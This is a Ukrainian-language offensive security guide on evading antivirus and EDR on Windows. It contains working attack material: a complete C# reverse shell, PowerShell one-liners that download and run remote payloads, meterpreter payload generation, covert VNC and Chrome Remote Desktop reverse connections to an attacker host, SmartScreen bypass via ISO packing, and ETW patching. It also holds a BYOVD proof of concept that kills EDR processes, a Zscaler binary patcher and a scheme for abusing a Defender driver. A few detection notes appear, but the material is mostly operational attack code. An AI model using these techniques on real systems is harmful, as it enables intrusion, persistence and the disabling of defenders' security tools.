Замість того щоб маскувати весь implant лише під час сну, модифікований backend LLVM X86 може підтримувати XOR-маскування вибраних функцій, коли вони неактивні. PoC Function Peekaboo вибирає демангльовані імена, що містять `REG_`, вставляє position-independent stubs входу/виходу навколо кінцевого машинного коду та розміщує один спільний обробник маскування в `.text`; сигнатури на рівні вихідного коду й угода викликів Windows x64 залишаються незмінними.<sup>[[38]](#references)[[39]](#references)</sup>

#### Трансформація потоку керування в backend

Це слід виконувати після вибору інструкцій і оптимізації, оскільки трансформація має охоплювати **кожну згенеровану інструкцію повернення** й враховувати точне розташування інструкцій x86. `MachineFunctionPass`, що виконується перед виведенням, знаходить останню `MachineInstr::isReturn()`, видаляє її, щоб кінцевий шлях переходив до доданого епілогу, а попередні інструкції повернення замінює на `JMP_1 handler`. Зберігайте згенероване компілятором відновлення стека/кадру перед кожною інструкцією повернення; перенаправляйте лише саму інструкцію повернення.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` і `X86AsmPrinter::emitFunctionBodyEnd()` виводять stubs для окремих функцій, а `emitEndOfAsmFile()` — обробник. Спільні між етапами виведення символи дають змогу переходу в прологу вказувати на епілог, який буде виведено пізніше; для `je` із ручним виведенням near-зсуву запишіть `0F 84`, а потім чотирибайтовий MC-вираз `target - address_after_je`. Виклики й переходи до обробника можна натомість виводити як об’єкти `MCInst` (`CALL64pcrel32` і `JMP_1`). Якщо функцію не вибрано й нічого не змінено, pass має повертати `false`; у PoC на цьому шляху помилково повертається `true`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Метадані та ініціалізація до CRT

PoC розміщує в `.funcmeta` ключ XOR і записи по 16 байтів, що містять вказівник на функцію, переміщений завантажувачем, і довжину під час виконання. Хоча поле C має тип `uint32_t`, обробник звертається до QWORD зі зміщенням `+8` у записі, використовуючи довжину та її доповнення, і переходить до наступних записів із кроком `0x10`. Назви секцій PE мають обмеження у вісім байтів, тому під час пошуку в runtime видно `.funcmet`. Зовнішній patcher додає виконувану секцію `.stub`, зберігає старий RVA точки входу в stub і перенаправляє `AddressOfEntryPoint`; PIC stub отримує базу образу через `gs:[0x60]` → `[PEB+0x10]`, проходить таблицю імпортів PE32+, щоб знайти вже імпортований `VirtualProtect`, і виконується до CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Під час ініціалізації в `gs:[0xE8]` встановлюється sentinel і викликається кожна функція з метаданих. Її пролог, який постійно залишається доступним для читання, записує початок функції в `gs:[0xF0]`, виявляє sentinel і пропускає ще не замасковане тіло. Далі в епілозі використовується `call handler`; після того як обробник зберігає 13 регістрів (`0x68` байтів), адреса повернення за `[rsp+0x68]` є кінцем трансформованої функції, тож `end - start` можна записати в її запис метаданих. Після маскування всіх тіл stub очищує sentinel і переходить до `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Під час звичайного виклику пролог викликає той самий симетричний обробник, щоб декодувати тіло. Кінцевий шлях переходить до доданого епілогу, а кожне попереднє повернення — безпосередньо до спільного обробника. У звичайному епілозі також використовується `jmp handler`, а не `call`, тому після повторного маскування `ret` обробника використовує адресу повернення початкового виклику, зберігаючи результат функції в `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Примітив маскування та індикатори аналізу

Обробник знаходить поточний запис, пропускає фіксований видимий пролог (у цій збірці — `0x46` байтів), змінює захист решти ділянки на `PAGE_EXECUTE_READWRITE`, виконує побайтовий XOR із молодшим байтом ключа, а потім встановлює `PAGE_EXECUTE_READ`. Отже, той самий цикл декодує тіло під час входу й кодує його під час кожного звичайного виходу.<sup>[[38]](#references)[[39]](#references)</sup>

До виразних індикаторів цієї техніки належать:<sup>[[38]](#references)[[39]](#references)</sup>

- точка входу всередині виконуваної секції `.stub` і секція `.funcmet`, що містить ключ і переміщені вказівники на `.text`;
- обробка PEB, таблиці імпортів і таблиці секцій до CRT, після якої виконуються виклики через кожен вказівник із метаданих;
- однакові PIC-прологи `call`/`pop` і численні місця повернення, перенаправлені до одного обробника;
- записи в `gs:[0xE8]`, `gs:[0xF0]` і `gs:[0xF8]`, після яких відбуваються повторювані переходи `VirtualProtect` і побайтовий XOR-запис у виконувані сторінки образу.

Це ухилення від сканерів пам’яті, а не криптографічний захист: виправлений файл усе ще містить початкове незашифроване тіло, а налагоджувач може встановити breakpoint на `VirtualProtect` або цикл XOR і зняти дамп активної функції. Однобайтовий XOR, метадані у відкритому вигляді та фіксована межа `0x46` також спрощують офлайн-відновлення.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> TEB-слоти в PoC є локальними для потоку, але змінені сторінки коду є спільними для всього процесу. Тому паралельний або рекурсивний вхід може повторно перемикати інструкції, поки виконується інший виклик; винятки й нелокальні виходи також можуть обійти повторне маскування. Надійна реалізація має синхронізувати переходи, відновлювати фактичний захист, повернутий через `lpflOldProtect`, не покладатися на жорстко задану довжину stub, перевіряти вирівнювання стека x64 для шляхів і `call`, і `jmp`, а також викликати `FlushInstructionCache` після перезапису виконуваних байтів. Microsoft прямо покладає на викликачів відповідальність за узгодженість кешу інструкцій під час модифікації виконуваного коду.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Можливо, ви бачили це вікно під час завантаження деяких виконуваних файлів з інтернету та їх запуску.

Microsoft Defender SmartScreen — це механізм безпеки, призначений для захисту кінцевого користувача від запуску потенційно шкідливих застосунків.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen переважно працює на основі репутації: маловідомі завантажені застосунки викликатимуть SmartScreen, який сповістить кінцевого користувача й завадить запуску файлу (хоча його все ще можна запустити, натиснувши More Info -> Run anyway).

**MoTW** (Mark of The Web) — це [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) з назвою Zone.Identifier, який автоматично створюється під час завантаження файлів з інтернету разом із URL-адресою, з якої їх завантажено.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Перевірка ADS Zone.Identifier для файлу, завантаженого з інтернету.</p></figcaption></figure>

> [!TIP]
> Важливо зазначити, що виконувані файли, підписані **довіреним** сертифікатом підпису, **не викликатимуть SmartScreen**.

Дуже ефективний спосіб не допустити позначення ваших payloads тегом Mark of The Web — запакувати їх у контейнер на кшталт ISO. Це працює тому, що Mark-of-the-Web (MOTW) **не можна** застосувати до томів, що **не використовують NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) — це інструмент, який пакує payloads у вихідні контейнери, щоб обійти Mark-of-the-Web.

Приклад використання:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Ось демонстрація обходу SmartScreen за допомогою пакування payloads у файли ISO через [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) — це потужний механізм журналювання у Windows, який дає змогу програмам і системним компонентам **записувати події**. Водночас його можуть використовувати засоби безпеки для моніторингу й виявлення шкідливої активності.

Подібно до вимкнення (обходу) AMSI, можна змусити функцію **`EtwEventWrite`** процесу в user space одразу повертати керування, не записуючи подій. Для цього функцію змінюють у пам’яті так, щоб вона одразу повертала керування, фактично вимикаючи журналювання ETW для цього процесу.

Більше інформації можна знайти в **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) та [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Завантаження C#-бінарників у пам’ять відоме вже давно й досі є чудовим способом запускати post-exploitation інструменти, не потрапляючи на очі AV.

Оскільки payload завантажуватиметься безпосередньо в пам’ять, не торкаючись диска, нам потрібно буде подбати лише про patching AMSI для всього процесу.

Більшість C2-фреймворків (sliver, Covenant, metasploit, CobaltStrike, Havoc тощо) вже дають змогу виконувати C#-збірки безпосередньо в пам’яті, але для цього є різні способи:

- **Fork\&Run**

Цей спосіб передбачає **створення нового sacrificial process**, ін’єкцію у нього шкідливого post-exploitation коду, виконання цього коду та завершення нового процесу після завершення роботи. Він має як переваги, так і недоліки. Перевага методу fork and run полягає в тому, що виконання відбувається **поза** процесом нашого імпланта Beacon. Це означає, що якщо під час виконання post-exploitation дій щось піде не так або буде виявлено, **імплант має набагато більше шансів вижити**. Недолік у тому, що **ймовірність виявлення** засобами **поведінкового виявлення** вища.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Цей спосіб передбачає ін’єкцію шкідливого post-exploitation коду **у власний процес**. Так можна не створювати новий процес, який перевірятиме AV, але якщо під час виконання payload щось піде не так, **ймовірність втратити beacon** буде значно вищою, оскільки процес може аварійно завершитися.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Якщо хочете дізнатися більше про завантаження C# Assembly, перегляньте цю статтю [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) та їхній InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Також можна завантажувати C# Assemblies **з PowerShell**. Перегляньте [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) і [відео від S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Використання інших мов програмування

Як запропоновано в [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), шкідливий код можна виконувати іншими мовами, надавши скомпрометованій машині доступ **до середовища інтерпретатора, розміщеного на SMB-шарі під контролем атакувальника**.

Надавши доступ до бінарників інтерпретатора та середовища на SMB-шарі, можна **виконувати довільний код цими мовами в пам’яті** скомпрометованої машини.

У репозиторії зазначено: Defender і далі сканує скрипти, але використання Go, Java, PHP тощо дає нам **більше можливостей для обходу статичних сигнатур**. Тестування випадкових необфускованих скриптів reverse shell цими мовами виявилося успішним.

## TokenStomping

Token stomping змінює токен доступу засобу безпеки, наприклад EDR або AV. Зниження привілеїв токена може залишити процес запущеним, водночас не даючи йому виконувати привілейовані дії з перевірки чи усунення загроз.

Щоб запобігти цьому, Windows може **заборонити зовнішнім процесам** отримувати handles до токенів процесів безпеки.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Використання довіреного ПЗ

### Chrome Remote Desktop

Як описано [**в цій публікації в блозі**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), Chrome Remote Desktop легко розгорнути на ПК жертви, а потім використати для отримання контролю над ним і закріплення в системі:<sup>[[35]](#references)</sup>
1. Завантажте програму з https://remotedesktop.google.com/, натисніть "Set up via SSH", а потім натисніть файл MSI для Windows, щоб завантажити його.
2. Запустіть інсталятор у тихому режимі на машині жертви (потрібні права адміністратора): `msiexec /i chromeremotedesktophost.msi /qn`
3. Поверніться на сторінку Chrome Remote Desktop і натисніть next. Майстер попросить авторизуватися; натисніть кнопку Authorize, щоб продовжити.
4. Виконайте надану команду з потрібними змінами: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (параметр `--pin` задає PIN без використання графічного інтерфейсу).
 

## Розширене ухилення від виявлення

Ухилення від виявлення — дуже складна тема. Іноді доводиться враховувати багато різних джерел телеметрії в одній системі, тож у зрілих середовищах практично неможливо залишатися повністю непоміченим.

Кожне середовище, з яким ви матимете справу, матиме власні сильні та слабкі сторони.

Наполегливо раджу переглянути цю доповідь від [@ATTL4S](https://twitter.com/DaniLJ94), щоб отримати уявлення про більш розширені техніки ухилення від виявлення.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Це ще одна чудова доповідь від [@mariuszbit](https://twitter.com/mariuszbit) про багаторівневе ухилення від виявлення.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Старі техніки**

### **Перевірка, які частини Defender вважає шкідливими**

Можна скористатися [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), який **видалятиме частини бінарника**, доки **не визначить, яку саме його частину Defender** вважає шкідливою, а потім покаже її вам.\
Ще один інструмент, який робить **те саме, — це** [**avred**](https://github.com/dobin/avred), а скористатися сервісом можна у відкритому вебі за адресою [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

До Windows10 усі версії Windows містили **Telnet server**, який можна було встановити (від імені адміністратора), виконавши:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Зробіть так, щоб він **запускався** під час запуску системи, і **запустіть** його зараз:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Змінити порт telnet** (непомітно) та вимкнути брандмауер:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Завантажте звідси: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (потрібні завантаження bin, а не setup)

**НА ХОСТІ**: Запустіть _**winvnc.exe**_ і налаштуйте сервер:

- Увімкніть параметр _Disable TrayIcon_
- Установіть пароль у _VNC Password_
- Установіть пароль у _View-Only Password_

Потім перемістіть бінарний файл _**winvnc.exe**_ і **щойно** створений файл _**UltraVNC.ini**_ на **машину-жертву**

#### **Зворотне підключення**

**Атакувальник** має **запустити на своєму** **хості** бінарний файл `vncviewer.exe -listen 5900`, щоб бути **готовим** прийняти зворотне **VNC-з’єднання**. Потім на **машині-жертві** запустіть демон winvnc командою `winvnc.exe -run` і виконайте `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**УВАГА:** Щоб зберегти непомітність, не робіть кількох речей

- Не запускайте `winvnc`, якщо він уже працює, інакше з’явиться [спливаюче вікно](https://i.imgur.com/1SROTTl.png). Перевірте, чи запущений він, командою `tasklist | findstr winvnc`
- Не запускайте `winvnc` без `UltraVNC.ini` у тій самій директорії, інакше відкриється [вікно конфігурації](https://i.imgur.com/rfMQWcf.png)
- Не запускайте `winvnc -h` для перегляду довідки, інакше з’явиться [спливаюче вікно](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Завантажте звідси: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Усередині GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Тепер **запустіть listener** за допомогою `msfconsole -r file.rc` і **виконайте** **XML payload** за допомогою:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Поточний Defender дуже швидко завершить процес.**

### Компілюємо власний reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Перший C# reverse shell

Скомпілюйте його за допомогою:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Використовуйте це з:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# із використанням компілятора

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Автоматичне завантаження та виконання:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Список C#-обфускаторів: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Використання python для створення інжекторів: приклад

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Інші інструменти

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Більше

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Принеси власний вразливий драйвер (BYOVD) — знищення AV/EDR з простору ядра

Storm-2603 використовував невелику консольну утиліту під назвою **Antivirus Terminator**, щоб вимкнути захист кінцевих точок перед розгортанням ransomware. Інструмент постачається зі **своїм вразливим, але *підписаним* драйвером** і зловживає ним для виконання привілейованих операцій ядра, які не можуть заблокувати навіть AV-служби з Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Основні висновки
1. **Підписаний драйвер**: файл, що записується на диск, — це `ServiceMouse.sys`, але двійковий файл є легітимно підписаним драйвером `AToolsKrnl64.sys` з «System In-Depth Analysis Toolkit» від Antiy Labs. Оскільки драйвер має дійсний підпис Microsoft, він завантажується навіть за ввімкненого Driver-Signature-Enforcement (DSE).
2. **Встановлення служби**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Перший рядок реєструє драйвер як **службу ядра**, а другий запускає його, завдяки чому `\\.\ServiceMouse` стає доступним із user land.
3. **IOCTL, які надає драйвер**
   | Код IOCTL | Можливість                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Завершити довільний процес за PID (використовується для зупинки служб Defender/EDR) |
   | `0x990000D0` | Видалити довільний файл із диска |
   | `0x990001D0` | Вивантажити драйвер і видалити службу |

   Мінімальний proof-of-concept на C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Чому це працює**: BYOVD повністю обходить захисти в режимі користувача; код, що виконується в ядрі, може відкривати *захищені* процеси, завершувати їх або втручатися в об’єкти ядра незалежно від PPL/PP, ELAM чи інших функцій посилення захисту.

Виявлення / пом’якшення наслідків
• Увімкніть список заблокованих вразливих драйверів Microsoft (`HVCI`, `Smart App Control`), щоб Windows відмовлялася завантажувати `AToolsKrnl64.sys`.
• Відстежуйте створення нових служб *ядра* та сповіщайте, якщо драйвер завантажується зі спільнодоступного для запису каталогу або відсутній у списку дозволених.
• Відстежуйте дескриптори з режиму користувача до спеціальних об’єктів пристроїв, за якими йдуть підозрілі виклики `DeviceIoControl`.

### Обхід перевірок стану пристрою Zscaler Client Connector за допомогою патчення двійкових файлів на диску

**Client Connector** від Zscaler локально застосовує правила оцінки стану пристрою та використовує Windows RPC для передавання результатів іншим компонентам. Обійти захист повністю дають змогу два слабкі рішення в дизайні:

1. Оцінювання стану пристрою виконується **цілком на стороні клієнта** (на сервер надсилається логічне значення).
2. Внутрішні кінцеві точки RPC перевіряють лише, чи **підписаний Zscaler** виконуваний файл, який підключається (за допомогою `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Патченням чотирьох підписаних двійкових файлів на диску** можна нейтралізувати обидва механізми:

| Двійковий файл | Оригінальна логіка, яку патчать | Результат |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Завжди повертає `1`, тому кожна перевірка вважається успішною |
| `ZSAService.exe` | Непрямий виклик `WinVerifyTrust` | Замінюється на NOP ⇒ до каналів RPC може підключитися будь-який процес (навіть без підпису) |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Замінюється на `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Перевірки цілісності тунелю | Передчасно обходяться |

Мінімальний фрагмент patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Після заміни оригінальних файлів і перезапуску стека служб:

* **Усі** перевірки стану відображаються як **зелені/відповідні вимогам**.
* Непідписані або змінені бінарні файли можуть відкривати кінцеві точки RPC через іменований канал (наприклад, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Скомпрометований хост отримує необмежений доступ до внутрішньої мережі, визначеної політиками Zscaler.

Цей приклад демонструє, як можна обійти суто клієнтські рішення щодо довіри та прості перевірки підписів за допомогою кількох байтових патчів.

## Зловживання довіреною функціональністю Microsoft Defender `BTR.sys`

Драйвер Defender **Boot-Time Removal** — корисний контрприклад класичному BYOVD. `BTR.sys` — легітимний компонент Microsoft із цифровим підписом для виправлення, у якому немає помилки пошкодження пам’яті чи інтерфейсу IOCTL; натомість, отримавши права адміністратора та `SeLoadDriverPrivilege`, оператор може підробити приватну транзакцію виправлення й отримати передбачені операції з файлами та реєстром на рівні Ring-0. Це **примітив нейтралізації AV/EDR після компрометації, а не початковий доступ чи підвищення привілеїв**. Драйвер можна отримати з ресурсу `BOOTTIMETOOL` у власному `MpEngine.dll` цільової системи, а не імпортувати помітний сторонній драйвер.<sup>[[36]](#references)</sup>

### Підготовка одноразового драйвера

Зазвичай Defender записує ресурс у файл із випадковою назвою `[a-z]{8}.sys` і реєструє однойменну службу ядра. `DriverEntry` зчитує значення `Args` служби, відкриває вказаний альтернативний потік даних NTFS (ADS), розшифровує та перевіряє список дій, записує зворотний зв’язок і повертає `0xC0000056` (`STATUS_DELETE_PENDING`) після успішного виконання, щоб драйвер вивантажився, а не залишався резидентним. Підроблена служба має такі характерні значення.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Потік `:changelist` містить один зашифрований RC4 blob. В аналізованих збірках повторно використовується фіксований ключ завдовжки 256 байтів, тому шифрування не є межею авторизації. Коректний відкритий текст містить глобальний заголовок завдовжки 24 байти (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC заголовка та ID транзакції, обчислений на основі корисного навантаження), за яким іде шлях до файлу зворотного зв’язку у форматі UTF-16 із завершальним нульовим символом і довільна кількість елементів. Кожен елемент має заголовок завдовжки 16 байтів (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) і дані, специфічні для дії, що завершуються **рівно чотирма байтами NUL**. Кожну область заголовка й даних перевіряють окремо за допомогою CRC-32 із поліномом `0xEDB88320`, початковим станом `0xFFFFFFFF` і **без фінального XOR** (`~CRC32`); для кожної області стан CRC скидається.<sup>[[36]](#references)[[37]](#references)</sup>

Прийняті ID дій відкривають доступ до таких примітивів ядра.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Дані елемента | Результат |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Видалення файлу, зокрема заблокованого |
| 2 | `[UTF-16 path]` | Видалення порожнього каталогу |
| 3 | `[Flags][source][destination]` | Переміщення файлу до захищеного шляху, вибраного зловмисником; порожнє поле призначення означає видалення |
| 4 | `[Flags][key path]` | Рекурсивне видалення ключа реєстру |
| 5 | `[Flags][key path + "\\" + value]` | Видалення значення реєстру |
